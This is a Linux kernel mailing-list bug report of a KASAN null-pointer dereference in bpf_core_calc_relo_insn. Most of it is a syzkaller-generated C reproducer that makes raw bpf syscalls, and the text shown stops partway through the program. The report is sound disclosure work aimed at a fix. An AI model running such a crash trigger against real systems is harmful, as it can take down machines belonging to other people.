Return-Path: <bpf+bounces-37611-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [147.75.199.223])
	by mail.lfdr.de (Postfix) with ESMTPS id 737A19581FD
	for <lists+bpf@lfdr.de>; Tue, 20 Aug 2024 11:21:58 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 6AA511C2418C
	for <lists+bpf@lfdr.de>; Tue, 20 Aug 2024 09:21:57 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 88EC218B48D;
	Tue, 20 Aug 2024 09:21:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ArlBH6SF"
X-Original-To: bpf@vger.kernel.org
Received: from mail-vs1-f54.google.com (mail-vs1-f54.google.com [209.85.217.54])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B273518A6C6;
	Tue, 20 Aug 2024 09:21:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.217.54
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1724145704; cv=none; b=bWGRUXe+TztwQe7iIbQvPoGVq/Uc/Z6K1rnBEPDgb/o7v85MsIYxs6RnLZfzgZZp8mBLD7XCPq7a1xcKdagyIGJxa1gJPQ0mCmHJCSArVxylfYSCEYQ7nMoF6dYHyz22y5Ub9jforSoFYQE8DH5SdKkxodyxtMe3h63yntWt4Po=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1724145704; c=relaxed/simple;
	bh=0g1pHpPE4ZDRsXWy5oyzn6Z/7hbcPSRIodQFTXFCglQ=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=rPr74M8KkPs/TOc+cfUwfo3Z6bLpIZr9JmOwS1EwvNals7AZPdppjyWhKNHlVGEOBjLW44CGTVDcgrOTr9eE3Z7hwHP1iXrqoCquIkaHTtOSCL94m4FG8sI0rpAAmbcwBD+EfB3BIzymEpQ3xhdIgdfUhb67tcdBTyzV8+W86l4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ArlBH6SF; arc=none smtp.client-ip=209.85.217.54
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-vs1-f54.google.com with SMTP id ada2fe7eead31-498cca5d48aso55996137.3;
        Tue, 20 Aug 2024 02:21:39 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1724145698; x=1724750498; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=a8bvsqGRmSdfsAG79rReuRxDIoBO5etk9ZAYQ3q1pyw=;
        b=ArlBH6SF4Da0VOV3Ok9cqi+qhy/y/uLUlJ+H53kRilKNW/6IDHutQyKouIrgnzZfBD
         8DoFCYAdSFIxDSePH0ijV0gAdSqflzziGh/7zcd2ZLO3HDu5m0kumHBArmzP5RwmaHpG
         zJpLQ/NMb9tVWBxGI+1btMzi7iZI1/76lx9CSzzf/u3HUsLHD3Ar2Yc4qvB4oVTuUavR
         FIW9Y71xbf0JS99QH9QgNA1kfI81sB4Ju24EJnkBQmxnffnvNN7xtjTgT1RIQfbKEK11
         w6VkCFPALBdVEtX76T/fUSynpZE0963QsZqPbAGvqRT+aKe1JU14HyB3PSd54eoKErTo
         PFYg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1724145698; x=1724750498;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=a8bvsqGRmSdfsAG79rReuRxDIoBO5etk9ZAYQ3q1pyw=;
        b=H5dL3lBBipf2qgFASie5erlmn/p7lfsShSZcxMI/ID6E/imY+uXE1EI6RAcsZfVSce
         L7d+ST5gT6AMcEY63ngiVsYxyt/fTWavc11MP5KIi75zOV47FRY/WSCNckwgDfl+72c1
         lOoicPE+wlM0Q7GY4LAcM+DMekGU/SOoA+YXlU8PBbQmE6ngMTfxqMsr4kz1N2dhh/yL
         BLbyJZvtIGsoxPkyTmrwPn1TNRZzDW7H+iDHFshflX6f+s0Ekp9faUeueTi6lK9v+grH
         xVQ5eYbyS5JwvU3i02NO2cDFf7U9pThfCySjn3/vY3IM2YTlO+nHMmdX9cB2W6wcHdBu
         7j6Q==
X-Forwarded-Encrypted: i=1; AJvYcCXppIcyBvB7x0kkQt6E1FOah6ZcXTnvArwQ5kMnPSi+u3KYqOYA72gFPJMozbT9Uy2NsznFvTaqbgWHIq/F7fFFihpsHZ20eSGZAA+BX/OeDbBmkL8KRzcJd9VuaCOUd58Q
X-Gm-Message-State: AOJu0Yx6xCkxI831xBeZzk8f5Ct1hmP+121WP47ZjDjXmV5lwSflh0VA
	raExoyhfCpUzNjzQ+pMGvgVZPit91KV5yg8uUTWcZsmqY/xua6hjwqNkuDWbcamz4wzxUnWOYo1
	+o/Kq5rcc9U7x41zRiWoiD+4NytLPJX3QnrfdI8VV
X-Google-Smtp-Source: AGHT+IGPoaozy4iHggq+X0i3BkZAiJsuBFZDoOxH+yJB+T8vcI0Ab5n0TQcUFVTTBaVNrJQXcr/CL18ot4IQkYi+D1M=
X-Received: by 2002:a05:6102:4191:b0:493:badb:74ef with SMTP id
 ada2fe7eead31-498c2180ac3mr1966999137.26.1724145697913; Tue, 20 Aug 2024
 02:21:37 -0700 (PDT)
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Liu RuiTong <cnitlrt@gmail.com>
Date: Tue, 20 Aug 2024 17:21:25 +0800
Message-ID: <CAK55_s6do7C+DVwbwY_7nKfUz0YLDoiA1v6X3Y9+p0sWzipFSA@mail.gmail.com>
Subject: KASAN: null-ptr-deref in bpf_core_calc_relo_insn
To: stable@vger.kernel.org
Cc: regressions@lists.linux.dev, bpf@vger.kernel.org, 
	linux-kernel@vger.kernel.org
Content-Type: multipart/mixed; boundary="000000000000dda6d2062019f35f"

--000000000000dda6d2062019f35f
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

https://bugzilla.kernel.org/show_bug.cgi?id=3D219181#c0
Hello,I found a bug in the Linux kernel version 6.11.0-rc4 using syzkaller.
The poc file is
```
//gcc poc.c -o poc --static
#define _GNU_SOURCE

#include <endian.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include <linux/futex.h>

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

static void sleep_ms(uint64_t ms)
{
    usleep(ms * 1000);
}

static uint64_t current_time_ms(void)
{
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts))
    exit(1);
    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void thread_start(void* (*fn)(void*), void* arg)
{
    pthread_t th;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 128 << 10);
    int i =3D 0;
    for (; i < 100; i++) {
        if (pthread_create(&th, &attr, fn, arg) =3D=3D 0) {
            pthread_attr_destroy(&attr);
            return;
        }
        if (errno =3D=3D EAGAIN) {
            usleep(50);
            continue;
        }
        break;
    }
    exit(1);
}

#define BITMASK(bf_off,bf_len) (((1ull << (bf_len)) - 1) << (bf_off))
#define STORE_BY_BITMASK(type,htobe,addr,val,bf_off,bf_len)
*(type*)(addr) =3D htobe((htobe(*(type*)(addr)) & ~BITMASK((bf_off),
(bf_len))) | (((type)(val) << (bf_off)) & BITMASK((bf_off),
(bf_len))))

typedef struct {
    int state;
} event_t;

static void event_init(event_t* ev)
{
    ev->state =3D 0;
}

static void event_reset(event_t* ev)
{
    ev->state =3D 0;
}

static void event_set(event_t* ev)
{
    if (ev->state)
    exit(1);
    __atomic_store_n(&ev->state, 1, __ATOMIC_RELEASE);
    syscall(SYS_futex, &ev->state, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1000000=
);
}

static void event_wait(event_t* ev)
{
    while (!__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
        syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, =
0);
}

static int event_isset(event_t* ev)
{
    return __atomic_load_n(&ev->state, __ATOMIC_ACQUIRE);
}

static int event_timedwait(event_t* ev, uint64_t timeout)
{
    uint64_t start =3D current_time_ms();
    uint64_t now =3D start;
    for (;;) {
        uint64_t remain =3D timeout - (now - start);
        struct timespec ts;
        ts.tv_sec =3D remain / 1000;
        ts.tv_nsec =3D (remain % 1000) * 1000 * 1000;
        syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, =
&ts);
        if (__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
            return 1;
        now =3D current_time_ms();
        if (now - start > timeout)
            return 0;
    }
}

struct thread_t {
    int created, call;
    event_t ready, done;
};

static struct thread_t threads[16];
static void execute_call(int call);
static int running;

static void* thr(void* arg)
{
    struct thread_t* th =3D (struct thread_t*)arg;
    for (;;) {
        event_wait(&th->ready);
        event_reset(&th->ready);
        execute_call(th->call);
        __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
        event_set(&th->done);
    }
    return 0;
}

static void loop(void)
{
    if (write(1, "executing program\n", sizeof("executing program\n") - 1))=
 {
    }
    int i, call, thread;
    for (call =3D 0; call < 3; call++) {
        for (thread =3D 0; thread < (int)(sizeof(threads) /
sizeof(threads[0])); thread++) {
            struct thread_t* th =3D &threads[thread];
            if (!th->created) {
                th->created =3D 1;
                event_init(&th->ready);
                event_init(&th->done);
                event_set(&th->done);
                thread_start(thr, th);
            }
            if (!event_isset(&th->done))
                continue;
            event_reset(&th->done);
            th->call =3D call;
            __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
            event_set(&th->ready);
            if (call =3D=3D 1)
                break;
            event_timedwait(&th->done, 50);
            break;
        }
    }
    for (i =3D 0; i < 100 && __atomic_load_n(&running, __ATOMIC_RELAXED); i=
++)
        sleep_ms(1);
}

uint64_t r[1] =3D {0xffffffffffffffff};

void execute_call(int call)
{
        intptr_t res =3D 0;
    switch (call) {
    case 0:
*(uint64_t*)0x20004e40 =3D 0x20004c80;
*(uint16_t*)0x20004c80 =3D 0xeb9f;
*(uint8_t*)0x20004c82 =3D 1;
*(uint8_t*)0x20004c83 =3D 0;
*(uint32_t*)0x20004c84 =3D 0x18;
*(uint32_t*)0x20004c88 =3D 0;
*(uint32_t*)0x20004c8c =3D 0xc;
*(uint32_t*)0x20004c90 =3D 0xc;
*(uint32_t*)0x20004c94 =3D 0xa;
*(uint32_t*)0x20004c98 =3D 8;
*(uint16_t*)0x20004c9c =3D 0;
*(uint8_t*)0x20004c9e =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20004c9f, 5, 0, 7);
STORE_BY_BITMASK(uint8_t, , 0x20004c9f, 0, 7, 1);
*(uint32_t*)0x20004ca0 =3D 6;
*(uint8_t*)0x20004ca4 =3D 0;
*(uint8_t*)0x20004ca5 =3D 0x30;
*(uint8_t*)0x20004ca6 =3D 0;
*(uint8_t*)0x20004ca7 =3D 0x30;
*(uint8_t*)0x20004ca8 =3D 0x61;
*(uint8_t*)0x20004ca9 =3D 0x1e;
*(uint8_t*)0x20004caa =3D 0x2f;
*(uint8_t*)0x20004cab =3D 0x30;
*(uint8_t*)0x20004cac =3D 0x2e;
*(uint8_t*)0x20004cad =3D 0;
*(uint64_t*)0x20004e48 =3D 0;
*(uint32_t*)0x20004e50 =3D 0x2e;
*(uint32_t*)0x20004e54 =3D 0;
*(uint32_t*)0x20004e58 =3D 1;
*(uint32_t*)0x20004e5c =3D 0x40;
        res =3D syscall(__NR_bpf, /*cmd=3D*/0x12ul, /*arg=3D*/0x20004e40ul,
/*size=3D*/0x20ul);
        if (res !=3D -1)
                r[0] =3D res;
        break;
    case 1:
*(uint32_t*)0x20000480 =3D 6;
*(uint32_t*)0x20000484 =3D 0x27;
*(uint64_t*)0x20000488 =3D 0x20000d40;
*(uint8_t*)0x20000d40 =3D 0x18;
STORE_BY_BITMASK(uint8_t, , 0x20000d41, 0, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d41, 0, 4, 4);
*(uint16_t*)0x20000d42 =3D 0;
*(uint32_t*)0x20000d44 =3D 8;
*(uint8_t*)0x20000d48 =3D 0;
*(uint8_t*)0x20000d49 =3D 0;
*(uint16_t*)0x20000d4a =3D 0;
*(uint32_t*)0x20000d4c =3D 7;
*(uint8_t*)0x20000d50 =3D 0x18;
STORE_BY_BITMASK(uint8_t, , 0x20000d51, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d51, 1, 4, 4);
*(uint16_t*)0x20000d52 =3D 0;
*(uint32_t*)0x20000d54 =3D -1;
*(uint8_t*)0x20000d58 =3D 0;
*(uint8_t*)0x20000d59 =3D 0;
*(uint16_t*)0x20000d5a =3D 0;
*(uint32_t*)0x20000d5c =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000d60, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000d60, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000d60, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d61, 2, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d61, 0, 4, 4);
*(uint16_t*)0x20000d62 =3D 0;
*(uint32_t*)0x20000d64 =3D 0x14;
STORE_BY_BITMASK(uint8_t, , 0x20000d68, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000d68, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000d68, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d69, 3, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d69, 0, 4, 4);
*(uint16_t*)0x20000d6a =3D 0;
*(uint32_t*)0x20000d6c =3D 0;
*(uint8_t*)0x20000d70 =3D 0x85;
*(uint8_t*)0x20000d71 =3D 0;
*(uint16_t*)0x20000d72 =3D 0;
*(uint32_t*)0x20000d74 =3D 0x83;
STORE_BY_BITMASK(uint8_t, , 0x20000d78, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000d78, 1, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000d78, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d79, 9, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d79, 0, 4, 4);
*(uint16_t*)0x20000d7a =3D 0;
*(uint32_t*)0x20000d7c =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000d80, 5, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000d80, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000d80, 5, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d81, 9, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d81, 0, 4, 4);
*(uint16_t*)0x20000d82 =3D 1;
*(uint32_t*)0x20000d84 =3D 0;
*(uint8_t*)0x20000d88 =3D 0x95;
*(uint8_t*)0x20000d89 =3D 0;
*(uint16_t*)0x20000d8a =3D 0;
*(uint32_t*)0x20000d8c =3D 0;
*(uint8_t*)0x20000d90 =3D 0x18;
STORE_BY_BITMASK(uint8_t, , 0x20000d91, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000d91, 1, 4, 4);
*(uint16_t*)0x20000d92 =3D 0;
*(uint32_t*)0x20000d94 =3D -1;
*(uint8_t*)0x20000d98 =3D 0;
*(uint8_t*)0x20000d99 =3D 0;
*(uint16_t*)0x20000d9a =3D 0;
*(uint32_t*)0x20000d9c =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000da0, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000da0, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000da0, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000da1, 2, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000da1, 0, 4, 4);
*(uint16_t*)0x20000da2 =3D 0;
*(uint32_t*)0x20000da4 =3D 0;
*(uint8_t*)0x20000da8 =3D 0x85;
*(uint8_t*)0x20000da9 =3D 0;
*(uint16_t*)0x20000daa =3D 0;
*(uint32_t*)0x20000dac =3D 0x86;
*(uint8_t*)0x20000db0 =3D 0x18;
STORE_BY_BITMASK(uint8_t, , 0x20000db1, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000db1, 0, 4, 4);
*(uint16_t*)0x20000db2 =3D 0;
*(uint32_t*)0x20000db4 =3D 0x25702020;
*(uint8_t*)0x20000db8 =3D 0;
*(uint8_t*)0x20000db9 =3D 0;
*(uint16_t*)0x20000dba =3D 0;
*(uint32_t*)0x20000dbc =3D 0x20202000;
STORE_BY_BITMASK(uint8_t, , 0x20000dc0, 3, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000dc0, 3, 3, 2);
STORE_BY_BITMASK(uint8_t, , 0x20000dc0, 3, 5, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000dc1, 0xa, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000dc1, 1, 4, 4);
*(uint16_t*)0x20000dc2 =3D 0xfff8;
*(uint32_t*)0x20000dc4 =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000dc8, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000dc8, 1, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000dc8, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000dc9, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000dc9, 0xa, 4, 4);
*(uint16_t*)0x20000dca =3D 0;
*(uint32_t*)0x20000dcc =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000dd0, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000dd0, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000dd0, 0, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000dd1, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000dd1, 0, 4, 4);
*(uint16_t*)0x20000dd2 =3D 0;
*(uint32_t*)0x20000dd4 =3D 0xfffffff8;
STORE_BY_BITMASK(uint8_t, , 0x20000dd8, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000dd8, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000dd8, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000dd9, 2, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000dd9, 0, 4, 4);
*(uint16_t*)0x20000dda =3D 0;
*(uint32_t*)0x20000ddc =3D 8;
STORE_BY_BITMASK(uint8_t, , 0x20000de0, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000de0, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000de0, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000de1, 3, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000de1, 0, 4, 4);
*(uint16_t*)0x20000de2 =3D 0;
*(uint32_t*)0x20000de4 =3D 0xffff;
*(uint8_t*)0x20000de8 =3D 0x85;
*(uint8_t*)0x20000de9 =3D 0;
*(uint16_t*)0x20000dea =3D 0;
*(uint32_t*)0x20000dec =3D 6;
*(uint8_t*)0x20000df0 =3D 0x18;
STORE_BY_BITMASK(uint8_t, , 0x20000df1, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000df1, 0, 4, 4);
*(uint16_t*)0x20000df2 =3D 0;
*(uint32_t*)0x20000df4 =3D 0x256c6c64;
*(uint8_t*)0x20000df8 =3D 0;
*(uint8_t*)0x20000df9 =3D 0;
*(uint16_t*)0x20000dfa =3D 0;
*(uint32_t*)0x20000dfc =3D 0x20202000;
STORE_BY_BITMASK(uint8_t, , 0x20000e00, 3, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e00, 3, 3, 2);
STORE_BY_BITMASK(uint8_t, , 0x20000e00, 3, 5, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e01, 0xa, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e01, 1, 4, 4);
*(uint16_t*)0x20000e02 =3D 0xfff8;
*(uint32_t*)0x20000e04 =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000e08, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e08, 1, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000e08, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e09, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e09, 0xa, 4, 4);
*(uint16_t*)0x20000e0a =3D 0;
*(uint32_t*)0x20000e0c =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000e10, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e10, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000e10, 0, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e11, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e11, 0, 4, 4);
*(uint16_t*)0x20000e12 =3D 0;
*(uint32_t*)0x20000e14 =3D 0xfffffff8;
STORE_BY_BITMASK(uint8_t, , 0x20000e18, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e18, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000e18, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e19, 2, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e19, 0, 4, 4);
*(uint16_t*)0x20000e1a =3D 0;
*(uint32_t*)0x20000e1c =3D 8;
STORE_BY_BITMASK(uint8_t, , 0x20000e20, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e20, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000e20, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e21, 3, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e21, 0, 4, 4);
*(uint16_t*)0x20000e22 =3D 0;
*(uint32_t*)0x20000e24 =3D 7;
*(uint8_t*)0x20000e28 =3D 0x85;
*(uint8_t*)0x20000e29 =3D 0;
*(uint16_t*)0x20000e2a =3D 0;
*(uint32_t*)0x20000e2c =3D 6;
*(uint8_t*)0x20000e30 =3D 0x18;
STORE_BY_BITMASK(uint8_t, , 0x20000e31, 8, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e31, 5, 4, 4);
*(uint16_t*)0x20000e32 =3D 0;
*(uint32_t*)0x20000e34 =3D 1;
*(uint8_t*)0x20000e38 =3D 0;
*(uint8_t*)0x20000e39 =3D 0;
*(uint16_t*)0x20000e3a =3D 0;
*(uint32_t*)0x20000e3c =3D 0;
*(uint8_t*)0x20000e40 =3D 0x18;
STORE_BY_BITMASK(uint8_t, , 0x20000e41, 6, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e41, 6, 4, 4);
*(uint16_t*)0x20000e42 =3D 0;
*(uint32_t*)0x20000e44 =3D 4;
*(uint8_t*)0x20000e48 =3D 0;
*(uint8_t*)0x20000e49 =3D 0;
*(uint16_t*)0x20000e4a =3D 0;
*(uint32_t*)0x20000e4c =3D 0xfffffffb;
STORE_BY_BITMASK(uint8_t, , 0x20000e50, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e50, 1, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000e50, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e51, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e51, 9, 4, 4);
*(uint16_t*)0x20000e52 =3D 0;
*(uint32_t*)0x20000e54 =3D 0;
STORE_BY_BITMASK(uint8_t, , 0x20000e58, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e58, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000e58, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e59, 2, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e59, 0, 4, 4);
*(uint16_t*)0x20000e5a =3D 0;
*(uint32_t*)0x20000e5c =3D 0;
*(uint8_t*)0x20000e60 =3D 0x85;
*(uint8_t*)0x20000e61 =3D 0;
*(uint16_t*)0x20000e62 =3D 0;
*(uint32_t*)0x20000e64 =3D 0x84;
STORE_BY_BITMASK(uint8_t, , 0x20000e68, 7, 0, 3);
STORE_BY_BITMASK(uint8_t, , 0x20000e68, 0, 3, 1);
STORE_BY_BITMASK(uint8_t, , 0x20000e68, 0xb, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e69, 0, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x20000e69, 0, 4, 4);
*(uint16_t*)0x20000e6a =3D 0;
*(uint32_t*)0x20000e6c =3D 0;
*(uint8_t*)0x20000e70 =3D 0x95;
*(uint8_t*)0x20000e71 =3D 0;
*(uint16_t*)0x20000e72 =3D 0;
*(uint32_t*)0x20000e74 =3D 0;
*(uint64_t*)0x20000490 =3D 0x20000040;
memcpy((void*)0x20000040, "GPL\000", 4);
*(uint32_t*)0x20000498 =3D 0xb;
*(uint32_t*)0x2000049c =3D 0xc0;
*(uint64_t*)0x200004a0 =3D 0x20000c80;
*(uint32_t*)0x200004a8 =3D 0x41100;
*(uint32_t*)0x200004ac =3D 0x38;
memset((void*)0x200004b0, 0, 16);
*(uint32_t*)0x200004c0 =3D 0;
*(uint32_t*)0x200004c4 =3D 0x25;
*(uint32_t*)0x200004c8 =3D r[0];
*(uint32_t*)0x200004cc =3D 8;
*(uint64_t*)0x200004d0 =3D 0;
*(uint32_t*)0x200004d8 =3D 0;
*(uint32_t*)0x200004dc =3D 0x10;
*(uint64_t*)0x200004e0 =3D 0x200002c0;
*(uint32_t*)0x200002c0 =3D 0;
*(uint32_t*)0x200002c4 =3D 0;
*(uint32_t*)0x200002c8 =3D 0;
*(uint32_t*)0x200002cc =3D 9;
*(uint32_t*)0x200004e8 =3D 1;
*(uint32_t*)0x200004ec =3D 0;
*(uint32_t*)0x200004f0 =3D 0;
*(uint32_t*)0x200004f4 =3D 9;
*(uint64_t*)0x200004f8 =3D 0x20000380;
*(uint32_t*)0x20000380 =3D -1;
*(uint32_t*)0x20000384 =3D -1;
*(uint32_t*)0x20000388 =3D -1;
*(uint64_t*)0x20000500 =3D 0x200003c0;
*(uint32_t*)0x200003c0 =3D 1;
*(uint32_t*)0x200003c4 =3D 4;
*(uint32_t*)0x200003c8 =3D 0xb;
*(uint32_t*)0x200003cc =3D 6;
*(uint32_t*)0x200003d0 =3D 2;
*(uint32_t*)0x200003d4 =3D 2;
*(uint32_t*)0x200003d8 =3D 1;
*(uint32_t*)0x200003dc =3D 0;
*(uint32_t*)0x200003e0 =3D 5;
*(uint32_t*)0x200003e4 =3D 4;
*(uint32_t*)0x200003e8 =3D 0xe;
*(uint32_t*)0x200003ec =3D 0xb;
*(uint32_t*)0x200003f0 =3D 2;
*(uint32_t*)0x200003f4 =3D 0x1000003;
*(uint32_t*)0x200003f8 =3D 2;
*(uint32_t*)0x200003fc =3D 3;
*(uint32_t*)0x20000400 =3D 2;
*(uint32_t*)0x20000404 =3D 5;
*(uint32_t*)0x20000408 =3D 0xa;
*(uint32_t*)0x2000040c =3D 5;
*(uint32_t*)0x20000410 =3D 3;
*(uint32_t*)0x20000414 =3D 1;
*(uint32_t*)0x20000418 =3D 0xa;
*(uint32_t*)0x2000041c =3D 3;
*(uint32_t*)0x20000420 =3D 3;
*(uint32_t*)0x20000424 =3D 3;
*(uint32_t*)0x20000428 =3D 5;
*(uint32_t*)0x2000042c =3D 8;
*(uint32_t*)0x20000430 =3D 3;
*(uint32_t*)0x20000434 =3D 1;
*(uint32_t*)0x20000438 =3D 5;
*(uint32_t*)0x2000043c =3D 5;
*(uint32_t*)0x20000440 =3D 0;
*(uint32_t*)0x20000444 =3D 2;
*(uint32_t*)0x20000448 =3D 0;
*(uint32_t*)0x2000044c =3D 7;
*(uint32_t*)0x20000508 =3D 0x10;
*(uint32_t*)0x2000050c =3D 0x10000;
